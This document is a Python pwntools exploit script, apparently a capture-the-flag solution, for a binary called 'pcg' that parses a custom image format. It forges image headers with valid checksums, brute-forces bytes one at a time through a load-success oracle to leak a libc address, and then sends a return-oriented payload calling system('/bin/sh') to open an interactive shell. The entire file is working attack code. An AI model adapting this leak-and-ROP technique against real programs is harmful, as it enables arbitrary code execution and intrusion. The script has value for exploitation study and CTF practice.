#!/usr/bin/env python3

from pwn import *
from tqdm import tqdm
'''
struct pcg_header {
	unsigned int magic;
	unsigned int checksum;
	unsigned char width;
	unsigned char height;
	unsigned char titleLen;
	unsigned short dataLen;
}
'''

def gen_pcg_buf(data=None):
	buf = bytearray.fromhex('504347FF 00000000 20 20 00 A400')
	if data: set_data(buf, data)
	return buf

def set_width(buf, w):
	buf[8] = w

def set_height(buf, h):
	buf[9] = h

'''
def set_title_len(buf, l):
	buf[10] = l
'''

def set_data_len(buf, l):
	buf[11] = l & 0xff
	buf[12] = l >> 8

def set_data(buf, data):
	set_data_len(buf, len(data))
	buf[13: ] = data

def set_checksum(buf):
	checksum = buf[: 4]
	for i in range(8, len(buf)):
		checksum[i % 4] ^= buf[i]
	buf[4: 8] = checksum

def skip():
	p.recvuntil(b'>> ')

def check_buf():
	skip()
	p.sendline(b'2')
	if b'Loaded' in p.recvline(): return True
	else: return False

def clear_buf():
	skip()
	p.sendline(b'3')
	skip()
	p.send(b'\x00' * 65534)

def fill_buf(buf):
	skip()
	p.sendline(b'3')
	skip()
	p.sendline(buf)

def leak_bytes_at_140A0(size=8):
	assert size < 13
	leaked = b''
	clear_buf()
	for i in range(size):
		# print(f'{i}: ', end='')
		_buf = gen_pcg_buf(b'\x00' * 19 + b'\n' + b'\x00' * (65536 - 0x20 - 1) + leaked + b'\x00')
		for j in tqdm(range(256)):
			buf = _buf[:]
			buf[-1] = j
			set_checksum(buf)
			while b'\n' in buf[4: 8]:
				k = buf[4: 8].index(b'\n')
				buf[4 + k] ^= 1
				buf[16 + k] ^= 1
			fill_buf(buf[: 32])
			if check_buf():
				# print(hex(j))
				leaked += bytes([j])
				break
		else:
			assert False
	return leaked

libc = ELF('./libc.so.6', checksec=False)
system_addr = libc.sym['system']
str_bin_sh = next(libc.search(b"/bin/sh\x00"))

p = process('./pcg')
#  p = remote('pcg.ctf.knping.pl', 30001)

# context.log_level = 'debug'

libc_base = u64(leak_bytes_at_140A0(8)) - libc.sym['_IO_2_1_stdout_']
print('libc_base: 0x%x' % libc_base)

pop_rdi_ret = 0x000000000002a3e5

orig_ret = 0x1892
dst_ret = 0x1918

data = b'\x1c' * (dst_ret - orig_ret)
buf = gen_pcg_buf(data)
set_checksum(buf)
fill_buf(buf)

skip()
p.sendline(b'2')
p.recvuntil(b'END\n')

payload = b'A' * 16 + b'B' * 8 +\
	p64(pop_rdi_ret + libc_base) +\
	p64(str_bin_sh + libc_base) +\
	p64(system_addr + libc_base)

assert b'\n' not in payload
p.sendline(payload)

p.interactive()
